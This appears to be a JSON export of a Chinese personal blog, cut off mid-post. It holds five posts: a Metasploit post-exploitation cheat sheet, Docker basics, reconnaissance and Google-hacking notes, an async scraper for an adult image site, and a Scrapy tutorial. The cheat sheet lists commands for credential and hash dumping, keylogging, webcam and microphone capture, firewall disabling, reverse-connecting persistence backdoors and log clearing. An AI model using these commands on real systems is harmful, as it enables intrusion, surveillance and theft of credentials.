[{"title":"msf后渗透使用","url":"/2022/04/18/msf后渗透使用/","content":"# msf后渗透命令整理\n\n- 后渗透基本知识\n- 权限维持,权限提升,内网渗透等\n- 内网渗透:信息收集,读取用户hash,浏览器密码等\n- 域渗透:获取域控权限\n\n## 1.后渗透基本操作\n```bash\nbackground\t\t    让meterpreter处于后台\nsessions -i 会话号\t    与会话进行交互\nquit \t\t\t    退出会话\nshell\t\t\t    获取一个交互式shell\nirb\t\t            开启ruby终端\n```\n\n\n## 2.文件操作命令\n```bash\ncat \t\t    查看文件内容\ngetwd\t\t    查看当前工作目录\nupload\t\t    上传文件\ndownload\t    下载文件\nedit\t\t    编辑文件\nsearch\t\t    搜索文件\n```\n\n\n## 3.网络命令\n```bash\nipconfig/ifconfig\t\t查看网络接口信息\nportwd\t\t\t\t端口转发\t本机监听端口\t把目标机端口转到本机端口上\nrdesktop\t\t\t使用rdesktop来连接 -u 用户名 -p 密码\nroute\t\t\t\t获取路由表\n```\n\n\n## 后渗透基本操作\n```bash\nps\t\t\t    查看当前进程\nmigrate pid\t            将meterpreter进程pid移动到指定进程中\nexecute -H -i -f cmd.exe    创建新进程cmd.exe -H不可见\t-i交互\ngetpid\t获                   取当前进程的pid\nkill pid\t            杀死进程\ngetuid\t                    查看当前权限\nsysinfo\t                    查看目标机系统信息\n```\n\n## 后渗透高级操作\n```bash\nrun post/windows/gather/enum_applications \t获取安装软件信息\nrun post/windows/gather/dumplinks \t\t获取最近的文件操作\nrun scraper \t\t\t                获取常见信息\t\nrun post/windows/gather/enum_patches \t        获取补丁信息\nrun post/windows/gather/enum_domain  \t        查找域控\n\nload命令  \nload mimikatz                                   加载mimikatz\nwdigest\t                                        获取用户密码\nload incognito                      加载incognito盗取主机用户令牌假冒用户\n```\n\n\n### 信息收集\n```bash\nrun post/windows/gather/checkvm\t\t检查是否为虚拟机\ncmd下 quser\t\t查看用户是否在线\nidletime\t\t检查受害者闲置了多久\nscreenshot\t        截屏\n```\n\n### 用户口令\n```bash\nhashdump\t获取用户hash\nrun post/windows/gather/smart_hashdump\t获取域的密码\n```\n\n\n### 权限提升\n```bash\n普通用户利用漏洞获取权限\nuse exploit/windows/local/ms18_8120_win32k_privesc\n```\n\n\n### 自动匹配提权模块\n```bash\nuse post/multi/recon/local_exploit_suggester\npost/windows/gather/enum_patches\n```\n\n### 关闭防火墙\n```bash\nnetsh advfirewall set allprofiles state off\n```\n\n\n### 本地提权\n```bash\nsearch local/ms\n```\n\n\n### 绕过UAC\n```bash\nuse exploit/windows/local/bypassuac \nuse exploit/windows/local/bypassuac_injection \nuse windows/local/bypassuac_vbs \nuse windows/local/ask\n```\n\n\n### 获取system权限\n```bash\ngetsystem\n```\n\n### 缓存口令\n```bash\n获取谷歌chrome缓存\nrun post/windows/gather/enum_chrome\n\n获取火狐firfox缓存\nrun post/windows/gather/enum_firefox\n\n获取IE缓存\nrun post/windows/gather/enum_ie\n```\n\n### 键盘记录\n```bash\nkeyscan_start\t开启键盘记录\nkeyscan_dump\t显示捕捉到的记录\nkeyscan_stop\t停止键盘记录\n```\n\n### 域口令获取\n```bash\nsteal_token 试图窃取指定(pid)进程的令牌\nuse incognito\t\t加载incoginto功能(盗取目标主机的令牌或是假冒用户)\nlist_tokens -u\t\t列出目标主机用户的可用令牌\nlist_tokens -g\t\t列出目标主机用户组的可用令牌\n```\n\n### 摄像头信息\n```bash\nrecord_mic\t音频录制\nwebcam_chat\t\t查看摄像头接口\nwebcam_list\t\t查看摄像头列表\nwebcam_stream\t摄像头视频获取\n```\n\n### 后门持久化,权限维持\n``` bash\n1.migrate\nmigrate pid\n可以将meterpreter的当前进程迁移到其他指定进程中,这样做的好处是给后门一个相对稳定的环境,同时可以防止杀软\n\n2.metsvc\nrun metsvc -A\nmeterpreter提供两种方式的后门,一种是通过服务启动(metsvc),一种是通过启动项启动(persistence).\n通过服务(metsvc)启动方式,优点是命令简单方便,不需要设置太多参数.缺点是只要发现了这个后门,所有人都可以连接\n\n3.persistence\nrun persistence -S -U -X -i 5 -p 端口 -r ip\n通过开机启动项启动的方式,缺点是命令参数多比较复杂,可能因为启动项权限原因,导致失败,且并无回显.优点是,因为载入启动项中,所以一般的杀软都会放行,如果在用shellcode做下免杀会更好,当然这是后话\n-A   自动启动一个匹配的exploit / multi / handler来连接到代理\n-L   如果未使用％TEMP％，则在目标主机中写入有效负载的位置。\n-P   有效负载使用，默认为windows / meterpreter / reverse_tcp。\n-S   作为服务自动启动代理程序（具有SYSTEM权限）\n-T   要使用的备用可执行模板\n-U   用户登录时自动启动代理\n-X   系统引导时自动启动代理程序\n-h   这个帮助菜单\n-i   每次连接尝试之间的时间间隔（秒）\n-p   运行Metasploit的系统正在侦听的端口\n-r   运行Metasploit监听连接的系统的IP\n\n4.run vnc(远程控制,类似3389远程桌面)\nrun vnc\n\trun post/windows/manager/enable_rdp\t开启远程桌面\n\n5.getuid(创建一个用户,客户端化)\n常用命令\nrun getuid -e\t\t开启远程桌面\nrun getuid -u name -p password\t\t添加用户\nrun getuid -f\t4446 -e\t将3389端口转发到4446\n```\n### 清除痕迹\n清楚所有日志信息\n```bash\nclearev\t\n```\n\n\n","tags":["kali","渗透"],"categories":["工具使用"]},{"title":"docker基本使用","url":"/2022/04/18/docker基本使用/","content":"## docker帮助命令\n```\ndocker version 显示版本信息\ndocker help 帮助\ndocker info 基本信息\n```\n## docker镜像命令\n```\ndocker images\n# 可选项\n-a, --all   # 列出所有镜像\n-q, --quite # 只显示镜像的id\n```\n\n#### docker search 搜索镜像\n```\n# 可选项\n--filter=STARS=3000 # 搜索星在3000以上的\n```\n\n#### docker pull 下载镜像\n```\n# 下载镜像 docker pull 镜像名 tag\n# 如果不写tag默认就是最新版\n```\n\n#### 删除容器\n```\ndocker rm -f id # 删除指定容器\ndocker rm -f $(docker images -qa) # 删除所有容器\n```\n\n\n\n## docker容器命令\n\n**新建容器并启动**\n```\n--name = \"名字\" # 给容器起一个名字\n-d            # 后台方式运行\n-it           # 使用交互式方式运行\n-P            # 指定容器的端口\n    1.ip:主机端口:容器端口\n    2.主机端口:容器端口(常用)\n    3.容器端口\n-p            # 随机端口\n```\n\n**使用**\n```\nchenci@MacBook-Pro ~ %docker run -it centos /bin/bash\n\n退出\nexit\n```\n\n**查看运行的容器**\n```\ndocker ps \n# -a 历史运行过的容器\n# -n=? 显示最近创建的容器\n# -q 只显示容器的编号\n```\n\n**启动和停止容器**\n```\ndocker start id #启动容器\ndocker restart id #重启容器\ndocker stop id #停止当前正在运行的容器\ndocker kill id #强制停止当前容器\n```\n\n**查看日志**\n```\ndocker logs -tf --tail 日志条数 id\n```\n\n**查看镜像元数据**\n```\ndocker inspect id\n```\n\n**进入正在运行的容器**\n```\n# 方法一\ndocker attach id # 进入容器正在执行的终端\n\n#方法二\ndocker exec -it id bashshell #进入容器后开启新的终端\n```\n\n**从容器拷贝文件到主机**\n```\ndocker cp id:容器内路径 目标主机路径\n```\n\n## 实例-安装nginx\n```\n1.搜索镜像\ndocker search nginx\n\n2.拉取镜像\ndocker pull nginx\n\n3.启动并映射到本地3344端口\ndocker run -d --name nginx01 -p 3344:80 nginx\n\n4.测试\ncurl localhost:3344\n\n5.进入容器\ndocker exec -it nginx01 /bin/bash\n```\n\n## 实例-安装tomcat\n```\n1.拉取镜像\n官方版\ndocker run -it --rm tomcat:9.0 #没有此镜像就会去自动下载,--rm退出后就删除镜像,一般用于测试\n\n1.拉取镜像\ndocker -pull tamcat\n\n2.启动并映射\ndocker run -d -p 3355:8080 --name tomcat01 tomcat\n\n3.测试访问,发现404\ncurl localhost:3355\n\n4.进入容器\ndocker exec -it tomcat01 /bin/bash\n\n5.拷贝\ncp -r webapps.dist/* webapps/\n```\n\n\n## commit镜像\n```shell\ndocker commit 提交容器成为一个新的副本\n\n#与git相似\ndocker commit -m='提交的描述信息' -a='作者' 容器id 目标镜像名:[tag]\n\n#1.利用原来的tomcat制作一个新镜像\ndocker commit -a='chenci' -m='add webapps' id tomcat02:1.0\n\n```\n\n## 容器数据卷\n```shell\n为了容器的持久化和同步操作\n```\n**使用数据卷**\n```shell\n挂载\ndocker run -it -v 主机目录:容器目录\n```\n**测试同步mysql**\n```shell\n#1.启动并映射端口,设置密码\ndocker run -d -p 3310:3306 -v /Users/chenci/guazai/mysql:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name some-mysql mysql:5.7\n\n#2.远程连接\nmysql -uroot -p123456 -h 10.30.3.100 -P 3310\n\n#3.在远程连接中创建数据库测试\n测试无误,本地和容器中都会多一个测试数据库\n```\n**具名和匿名挂载**\n```shell\n#只写了容器内的路径,就是匿名挂载\ndocker run -it -P --name nginx -V /path id\n#查看\nlocal     6c71f963cc89b24d16b4b47cb35df42445ff9d9395753b192ba72cbbbc22d583\n\n\n#写了名字就是具名挂载\ndocker run -it -P --name nginx -V juming /path id\n#查看\nlocal     juming\n\n\n#查看所有的volume\ndocker volume ls\n\n#查看卷\ndocker volume inspect juming\n\n```\n**`通过具名可以方便找到一个卷通所以一般使用具名挂载`**\n```shell\n-v 容器内路径 #匿名挂载\n-v 卷名:容器内路径 #匿名挂载\n```\n**`扩展`**\n```shell\n#在路径后面跟:ro或则rw\nro表示这个路径只能通过宿主机来操作,容器内部无法操作\n```\n\n","tags":["教程","docker"],"categories":["工具使用"]},{"title":"信息收集","url":"/2022/04/17/信息收集/","content":"\n# 信息收集流程框架\n    web安全的本质是信息收集,信息收集的广度决定了渗透测试的深度\n\n![1](img.png)\n\n# google hacking\n利用谷歌强大的搜索引擎,经常会有意想不到的的收获\n\n## 基本的搜索\n- 逻辑与 and\n- 逻辑或 or\n- 逻辑非 \n- 通配符 *\n\n## 应用\nintext寻找网页正文中的关键字,如: intext后台登录\n\n![intext后台登录](img_1.png)\n\nintitle寻找网页标题中的关键字,如: intitle\n\n![intitle](img_2.png)\n\nallintitle用法和intitle差不多,差别在于可指定多个关键字\ninurl返回url中含有关键字的网页,如: inurl:login\n\n![inurl:login](img_3.png)\n\n查找管理员登录界面\n\n![管理员登录界面](img_4.png)\n\n\n查找phpmyadmin\n\n![phpmyadmin](img_5.png)\n\nallinurl和inurl的用法差不多,差别在于可指定多个关键字\nsite指定访问的网站,如,site:baidu.com inurl:login\n\n![allinurl](img_6.png)\n\n## 查找网站后台\n\n- site:xx.com intext:管理\n- site:xx.com inurl:login\n- site:xx.com intitle:后台\n\n## 查看服务器使用的程序\n\n- site:xx.com filetype:asp\n- site:xx.com filetype:php\n- site:xx.com filetype:jsp\n- site:xx.com filetype:aspx\n\n## 查看上传漏洞\n- site:xx.com inurl:file\n- site:xx.com inurl:load\n\n# dns域名信息\n首先是对应域名的ip,域名注册人,邮箱,dns,子域名之类的信息\n\n![allinurl](img_7.png)\n\n## whois查询\n- 然后判断是否有cdn\thttp://cdn.chinaz.com\n- 也可以使用不同地区的电脑ping,看ip是否是同一个\n- 如果查询出的ip有多个就说明使用了cdn\n\n## CDN查询\n- 绕过cdn查询真实ip https://x.threatbook.cn/ 微步\n\n# 整站分析\n服务器类型\n- 服务器平台,版本等\n网站容器\n- 搭建网站的服务组件,如:iis,apache,nginx等等\n脚本类型\n- 常见的有asp,php,jsp,aspx\n数据库类型\n- 常见的有access,sqlserver,mysql,oracle\ncms类型\n- 网站模板\nwaf\n- 安全防护软件\n\n## 服务器类型(windows/linux)\n- nmap 扫描\n- google抓包分析\n\n## 网站容器(iis,apache,nginx)\n知道网站容器很重要,如iis6.0的解析漏洞,ngixn<0.83的解析漏洞.,iis7.0的畸形解析漏洞等等\n- nmap 扫描\n- google抓包分析\n\n## 脚本类型(php,jsp,asp,aspx等)\n- 根据网站的url\n- 直接打开一个展示页面查看\n- 根据firefox的插件查看\n\n## 数据库类型\n- mysql端口为3389,数据库后缀名.sql\n- sqlserver端口为1433,数据库后缀名.mdf\n- access后缀名为.mdb\n- oraacle,端口为1521\n\n一般的常见搭配为\n\n- ASP和ASPX:access,sqlserver\n- PHP:mysql\n- JSP:oracle,mysql\n\n## 端口扫描\n扫描目标开放了哪些端口,如常见的135,137,445经常爆发出漏洞\n- 21,22,23,3389\tftp,ssh,telnet,windows远程桌面\n- 873 rsync 未授权访问漏洞\n- 3306 mysql 弱口令\n- 6379 redis未授权访问漏洞\n\n## 网站敏感目录和文件\n- 后台目录:万能密码,弱口令,爆破\n- 安装包:获取数据库信息,甚至是网站源码\n- 上传目录:上传木马,一句话等\n- mysql管理接口:爆破,弱口令,万能密码,甚至能直接拿shell\n- phpinfo:暴露各种配置信息\n- 编辑器:各种畸形漏洞\n- robots.txt\n\n## 旁站和C段\n- 旁站指的是同一服务器上得不同网站,如果你拿不下这个网站,不如试试旁站.拿下旁站webshell,再提权也就拿下了这个网站了\n\n- C段指的是同一网段的其他服务器,192.168.0.1,0就是C段.如果拿下了C段中一台服务器,就可使用嗅探工具,arp欺骗等劫持流量,找到关键信息,拿下服务器\n\n- 旁站查询:http://s.tool.chinaz.com/same\n\n- C段查询:http://www.webscan.cc/\n\n","tags":["web安全","信息收集"],"categories":["web安全"]},{"title":"异步协程爬取福利姬涩图","url":"/2022/04/14/异步爬取某涩情网站图片/","content":"\n\n```python\n# -*- coding: utf-8 -*-\n\"\"\"\n-------------------------------------------------\n   File Name：     协程4-实战爬取tuao8.com\n   Author :       chenci\n   date：          2022/3/25\n-------------------------------------------------\n\"\"\"\nimport aiofiles\nimport requests\nfrom lxml import etree\nimport asyncio\nimport aiohttp\nfrom fake_useragent import UserAgent\nimport os\nimport time\n\ndef create_dir_not_exist(path):\n    if not os.path.exists(path):\n        os.makedirs(path)\n\n\n# 抓取每个条目的图集\ndef get_photos_url():\n    resp = requests.get(url='https://www.tuao8.xyz/category-2_1.html', headers=header)\n    text = etree.HTML(resp.text)\n    href_url_list = text.xpath('//*[@id=\"container\"]/main/article/div/a/@href')\n    return href_url_list\n\n\n# 去请求每个图集.返回源码\nasync def get_photos(photo_list):\n    # 限制并发熟路默认100,0为无限制\n    conn = aiohttp.TCPConnector(limit=10)\n    # 发送请求\n    async with aiohttp.ClientSession(connector=conn) as session:\n        async with await session.get(url=photo_list, headers=header) as resp:\n            page_text = await resp.text()\n            await get_photos_title_page(page_text, photo_list)\n\n\n# 从每个源码里筛选出标题和最大页码,url\nasync def get_photos_title_page(text, url):\n    tasks = []\n    html = etree.HTML(text)\n    title = html.xpath('//*[@id=\"container\"]/main/article/h1/text()')[0]\n    max_page = int(html.xpath('//*[@id=\"dm-fy\"]/li[last()-1]/a/text()')[0])\n    create_dir_not_exist(f'./imgs/tuzo_xc/{title}')\n    task = asyncio.create_task(get_download_url(url=url, title=title, max_page=max_page))\n    tasks.append(task)\n    await asyncio.wait(tasks)\n\n\n# 获取每一页的url并从源码中筛选出每张图片的下载链接\nasync def get_download_url(url, title, max_page):\n    tasks = []\n    for i in range(1, max_page):\n        urls = f'{url}?page={i}'\n        conn = aiohttp.TCPConnector(limit=10)\n        async with aiohttp.ClientSession(connector=conn) as session:\n            async with await session.get(url=urls, headers=header) as resp:\n                page_text = await resp.text()\n                html = etree.HTML(page_text)\n                image_url = html.xpath('//*[@class=\"entry\"]//img/@src')[0]\n                task = asyncio.create_task(download_image(image_url, title, i))\n                tasks.append(task)\n    await asyncio.wait(tasks)\n\n\n# 下载\nasync def download_image(image_url, title, i):\n    conn = aiohttp.TCPConnector(limit=30)\n    async with aiohttp.ClientSession(connector=conn) as session:\n        try:\n            async with await session.get(url=image_url, headers=header) as resp:\n                print(image_url)\n                async with aiofiles.open(f'./imgs/{title}/{i}.jpg', 'wb') as f:\n                    print(f'正在下载{title}  第{i}张')\n                    await f.write(await resp.read())\n        except:\n            pass\n        print('下载完成')\n\n\nasync def main():\n    href_url_list = get_photos_url()\n    tasks = []\n    for url in href_url_list:\n        task = asyncio.create_task(get_photos(photo_list=url))\n        tasks.append(task)\n    await asyncio.wait(tasks)\n\n\nif __name__ == '__main__':\n    start = time.time()\n    ua = UserAgent()\n    header = {\n        'Referer': 'https://www.tuao8.xyz/category-2_2.html',\n        'user-agent': ua.random\n    }\n    asyncio.run(main())\n    end = time.time()\n    print('全部下载完成!耗时:', int(end - start), '秒')\n\n\n```\n![1](img.png)\n","tags":["requests","异步"],"categories":["爬虫"]},{"title":"scrapy框架学习","url":"/2022/04/08/scrapy框架学习/","content":"\n## 创建项目\n\n```bash\nscrapy startproject tutorial\n```\n\n## 创建任务\n\n```bash\nscrapy genspider first www.baidu.com\n```\n\n会生成一个first文件\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    # 唯一标识符\n    name = 'first'\n    # 允许的域名\n    allowed_domains = ['www.baidu.com']\n    # 起始的url,默认发送get请求\n    start_urls = ['https://www.baidu.com/']\n\n    # 数据解析\n    def parse(self, response):\n        pass\n```\n\n## 修改配置文件\n\n只输出ERROR级别的日志\n\n```python\n# 只输出ERROR级别的日志\nLOG_LEVEL = 'ERROR'\n```\n\n不遵从robots协议\n\n```python\nROBOTSTXT_OBEY = False  \n```\n\n指定ua\n\n```python\nUSER_AGENT = 'tutorial (+http://www.yourdomain.com)'\n```\n\n## 运行程序\n\n```bash\nscrapy crawl first\n```\n\n会输出一个response对象\n\n```\n<200 https://www.baidu.com/>\n```\n\n## 数据解析\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            print(title)\n\n```\n\n可以看到返回了一个selector对象,我们想要的数据在data属性里\n\n```bash\nchenci@MacBook-Pro tutorial %scrapy crawl first\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='如果你得罪了老板，失去的只是一份工作；如果你得罪了客户，失去的不过是一份订...'>\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='有位非常漂亮的女同事，有天起晚了没有时间化妆便急忙冲到公司。结果那天她被记...'>\n<Selector xpath='//*[@id=\"list\"]/ul/li/div[1]/text()' data='悟空和唐僧一起上某卫视非诚勿扰,悟空上台,24盏灯全灭。理由:1.没房没车...'>\n```\n\n从data属性中取出我们想要的数据\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # 取出数据\n            title = title.extract()  # extract_first()取第一个\n            print(title)\n\n```\n\n## 持久化存储\n\n### 1.基于终端指令的存储\n\n```python\nimport scrapy\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        data_all = []\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # 取出数据\n            title = title.extract()  # extract_first()取第一个\n            # 构造字典\n            dic = {\n                'title': title\n            }\n            data_all.append(dic)\n        # 返回一个列表\n        return data_all\n```\n\n执行\n\n```bash\nchenci@MacBook-Pro tutorial %scrapy crawl first -o test.csv\n```\n\n### 2.基于管道的持久化存储\n\n开启管道\n\nsettings.py\n\n```python\nITEM_PIPELINES = {\n    'tutorial.pipelines.TutorialPipeline': 300,  # 300表示优先级,越小优先级越高\n}\n```\n\n在items.py中定义相关属性\n\n```python\nimport scrapy\n\n\nclass TutorialItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    # Field定义好的属性当做万能属性\n    title = scrapy.Field()\n\n```\n\n将first.py提取出的数据提交给管道\n\n```python\nimport scrapy\nfrom tutorial.items import TutorialItem\n\n\nclass FirstSpider(scrapy.Spider):\n    name = 'first'\n    start_urls = ['https://ishuo.cn/']\n\n    def parse(self, response):\n        # 返回一个selector对象\n        title_list = response.xpath('//*[@id=\"list\"]/ul/li/div[1]/text()')\n        for title in title_list:\n            # 取出数据\n            title = title.extract()  # extract_first()取第一个\n\n            # 实例化一个item对象,将解析到的数据存入到该对象\n            item = TutorialItem()\n            # 通过字典的方式调用\n            item['title'] = title\n            # 将item对象提交给管道\n            yield item\n\n```\n\n在pipelines.py中重写父类方法,存储到本地\n\n```python\nclass TutorialPipeline:\n    # 重写父类方法\n    f = None\n\n    def open_spider(self, spider):\n        print('我是open_spider,只会在爬虫开始的时候执行一次')\n        self.f = open('./text1.txt', 'w', encoding='utf-8')\n\n    def close_spider(self, spider):\n        print('我是close_spider,只会在爬虫开始的时候执行一次')\n        self.f.close()\n\n    # 该方法是用来接收item对象的,一次只能接收一个item,说明该方法会被多次调用\n    # 参数item就是接收的item对象\n    def process_item(self, item, spider):\n        # 存储到本地文件\n        self.f.write(item['title'] + '\\n')\n        return item\n```\n\n基于管道实现数据的备份\n\npipelines.py\n\n```python\nimport pymysql\n\n\nclass MysqlPipeline(object):\n    conn = None\n    cursor = None\n\n    # 重写父类\n    def open_spider(self, spider):\n        # 数据库连接对象\n        self.conn = pymysql.Connect(host='localhost', port=3306, user='root', password='123456', charset='utf8',\n                                    db='spider')\n\n    def process_item(self, item, spider):\n        self.cursor = self.conn.cursor()\n        sql = 'insert into duanzi values(\"%s\")' % item['title']\n        # 事务处理\n        try:\n            self.cursor.execute(sql)\n            self.conn.commit()\n        except Exception as e:\n            print(e)\n            self.conn.rollback()\n        # 返回item会给下一个管道使用,如果不返回,下一个管道将接收不到\n        return item\n\n    # 重写父类,关闭连接\n    def close_spider(self, spider):\n        self.cursor.close()\n        self.conn.close()\n\n```\n\n在settings.py增加一个管道\n\n```python\nITEM_PIPELINES = {\n    # 爬虫文件中的item只会提交给优先级最高的那一个管道类\n    'tutorial.pipelines.TutorialPipeline': 300,\n    'tutorial.pipelines.MysqlPipeline': 301,\n}\n```\n\n## 手动请求发送\n\n新建工程\n\n```bash\nchenci@MacBook-Pro scrapy %scrapy startproject HandReq\nchenci@MacBook-Pro scrapy %cd HandReq \nchenci@MacBook-Pro HandReq %scrapy genspider duanzi www.xxx.com\n```\n\n```python\nimport scrapy\nfrom HandReq.items import HandreqItem\n\n\nclass DuanziSpider(scrapy.Spider):\n    name = 'duanzi'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://duanzixing.com/page/1/']\n\n    # 通用的url模板\n    url = 'https://duanzixing.com/page/%d/'\n    page_num = 2\n\n    def parse(self, response):\n        title_list = response.xpath('/html/body/section/div/div/article[1]/header/h2/a/text()')\n        for title in title_list:\n            title = title.extract()\n            item = HandreqItem()\n            item['title'] = title\n            yield item\n\n        if self.page_num < 5:\n            # 构造页码\n            new_url = format(self.url % self.page_num)\n            self.page_num += 1\n            # 对新的url发起请求,递归回调自己\n            yield scrapy.Request(url=new_url, callback=self.parse)\n            # scrapy.FormRequest(url,callback,formdata) 发送post请求\n\n```\n\n## 五大核心组件工作流程\n\n![1](img.png)\n\n引擎(Scrapy)\n\n    用来处理整个系统的数据流处理, 触发事务(框架核心)\n\n调度器(Scheduler)\n\n    用来接受引擎发过来的请求, 压入队列中, 并在引擎再次请求的时候返回. 可以想像成一个URL（抓取网页的网址或者说是链接）的优先队列, 由它来决定下一个要抓取的网址是什么, 同时去除重复的网址\n\n下载器(Downloader)\n\n    用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的)\n\n爬虫(Spiders)\n\n    爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面\n\n项目管道(Pipeline)\n\n    负责处理爬虫从网页中抽取的实体，主要的功能是持久化实体、验证实体的有效性、清除不需要的信息。当页面被爬虫解析后，将被发送到项目管道，并经过几个特定的次序处理数据。\n\n## 请求传参的深度爬取-4567kan.com\n\n文件目录\n\n![1](img_1.png)\n\n    meta是一个字典,可以将meta传给callback\n        scrapy.Request(url, callback, meta)\n\n    callback取出字典\n        item = response.meta['item']\n\nmove.py 项目文件\n\n```python\nimport scrapy\nfrom move_4567kan.items import Move4567KanItem\n\n\nclass MoveSpider(scrapy.Spider):\n    name = 'move'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.4567kan.com/frim/index1-1.html']\n\n    # 构造页码\n    url = 'https://www.4567kan.com/frim/index1-%d.html'\n    page_num = 2\n\n    def parse(self, response):\n        # 抓取url和title\n        li_list = response.xpath('/html/body/div[2]/div/div[3]/div/div[2]/ul/li')\n        for li in li_list:\n            url = 'https://www.4567kan.com' + li.xpath('./div/a/@href').extract()[0]\n            title = li.xpath('./div/a/@title').extract()[0]\n\n            # 传递给item\n            item = Move4567KanItem()\n            item['title'] = title\n\n            # 对详情页发起请求,回调get_details函数\n            # meta请求传参,以字典形式,传给get_details函数,因为item只能是唯一\n            yield scrapy.Request(url=url, callback=self.get_details, meta={'item': item})\n\n        # 爬取多页\n        if self.page_num < 5:\n            # 构造页码\n            new_url = format(self.url % self.page_num)\n            self.page_num += 1\n            # 对新的url发起请求,递归回调自己\n            yield scrapy.Request(url=new_url, callback=self.parse)\n\n    # 自定义函数去抓取详情\n    def get_details(self, response):\n        details = response.xpath('//*[@class=\"detail-content\"]/text()').extract()\n        # 判断,没有返回None\n        if details:\n            details = details[0]\n        else:\n            details = None\n        # 接受item\n        item = response.meta['item']\n        item['details'] = details\n        # 提交给管道\n        yield item\n\n```\n\nitems.py 定义两个字段\n\n```python\nimport scrapy\n\n\nclass Move4567KanItem(scrapy.Item):\n    # define the fields for your item here like:\n    # name = scrapy.Field()\n    title = scrapy.Field()\n    details = scrapy.Field()\n\n```\n\npipelines.py 打印输出\n\n```python\nclass Move4567KanPipeline:\n    def process_item(self, item, spider):\n        print(item)\n        return item\n\n```\n\n## 中间件\n\n作用\n\n    拦截请求和响应\n\n爬虫中间件\n\n    略\n\n下载中间件(推荐)\n\n    拦截请求:    \n        1.篡改请求url\n        2.伪装请求头信息:\n            UA\n            Cookie\n        3.设置请求代理\n\n    拦截响应:\n        篡改响应数据\n\n改写中间件文件 middlewares.py\n\n```python\n\nfrom scrapy import signals\nfrom itemadapter import is_item, ItemAdapter\n\n\nclass MiddleDownloaderMiddleware:\n\n    # 拦截所有请求\n    # request就是拦截到的请求,spider就是爬虫类实例化的对象\n    def process_request(self, request, spider):\n        print('我是process_request()')\n        return None\n\n    # 拦截所有响应对象\n    # request就是response响应对象对应的请求对象,response就是拦截到的响应对象\n    def process_response(self, request, response, spider):\n        print('我是process_response()')\n        return response\n\n    # 拦截异常请求\n    # request就是拦截到的异常请求的请求对象\n    # 作用:修正异常请求,将其 重新发送\n    def process_exception(self, request, exception, spider):\n        print('我是process_exception()')\n        # pass\n```\n\n编写爬虫文件\n\n```python\nimport scrapy\n\n\nclass MidSpider(scrapy.Spider):\n    name = 'mid'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.baidu.com', 'https://www.sogou.com']\n\n    def parse(self, response):\n        print(response)\n\n```\n\n在配置文件setting.py中启用\n\n```python\nROBOTSTXT_OBEY = True\n\nDOWNLOADER_MIDDLEWARES = {\n    'middle.middlewares.MiddleDownloaderMiddleware': 543,\n}\n```\n\n启动工程\n\n```bash\nchenci@MacBook-Pro middle %scrapy crawl mid\n我是process_request()\n我是process_request()\n我是process_response()\n我是process_exception()\n我是process_response()\n我是process_exception()\n```\n\nprocess_exception()方法设置代理\n\n```python\n# 拦截异常请求\n# request就是拦截到的异常请求的请求对象\n# 作用:修正异常请求,将其 重新发送\ndef process_exception(self, request, exception, spider):\n    # 请求的ip被禁,该请求就会变成一个异常请求,加入代理\n    request.meta['proxy_'] = 'https://ip:port'\n    print('我是process_exception()')\n    # 将异常的请求修正后重新发送\n    return request\n    # 可能会造成死循环,因为如果加入代理后依旧发生异常,会再次加入代理去请求\n```\n\nprocess_request()方法设置headers\n\n```python\ndef process_request(self, request, spider):\n    # 设置请求头,但一般不这么写,可以在setting.py中设置全局\n    request.headers['User-Agent'] = 'xxx'\n    request.headers['Cookie'] = 'xxx'\n    print('我是process_request()')\n    return None\n```\n\nprocess_response()方法篡改响应数据\n\n```python\n# 拦截所有响应对象\n# request就是response响应对象对应的请求对象,response就是拦截到的响应对象\ndef process_response(self, request, response, spider):\n    # 篡改响应数据\n    response.text = 'xxx'\n    print('我是process_response()')\n    return response\n```\n\n## 大文件下载-爬取jdlingyu.com图片\n\n文件目录\n\n![1](img_2.png)\n\nimg.py\n\n```python\nimport scrapy\nfrom imgdownload.items import ImgdownloadItem\n\n\nclass ImgSpider(scrapy.Spider):\n    name = 'img'\n    # allowed_domains = ['www.xxx.com']\n    start_urls = ['https://www.jdlingyu.com']\n\n    def parse(self, response):\n        li_list = response.xpath('/html/body/div[1]/div[2]/div[1]/div/div[6]/div/div[1]/div/div[2]/ul/li')\n        for a in li_list:\n            url = a.xpath('./div/div[2]/h2/a/@href').extract()[0]\n            title = a.xpath('./div/div[2]/h2/a/text()').extract()[0]\n\n            # 传递给itme\n            item = ImgdownloadItem()\n            item['title'] = title\n\n            # 回调并传递参数\n            yield scrapy.Request(url=url, callback=self.get_img_url, meta={'item': item})\n\n    # 对每个图集的url发起请求\n    def get_img_url(self, response):\n        page = 0\n        item = response.meta['item']\n        # 抓取每张图片的下载链接\n        img_list = response.xpath('//*[@id=\"primary-home\"]/article/div[2]/img')\n        for scr in img_list:\n            img_url = scr.xpath('./@src').extract()[0]\n            page += 1\n            # 传递给item\n            item['img_url'] = img_url\n            item['page'] = page\n            # 提交给管道\n            yield item\n\n```\n\nsetting.py增加配置\n\n```python\nUSER_AGENT = 'ua'\nROBOTSTXT_OBEY = False\nLOG_LEVEL = 'ERROR'\n# 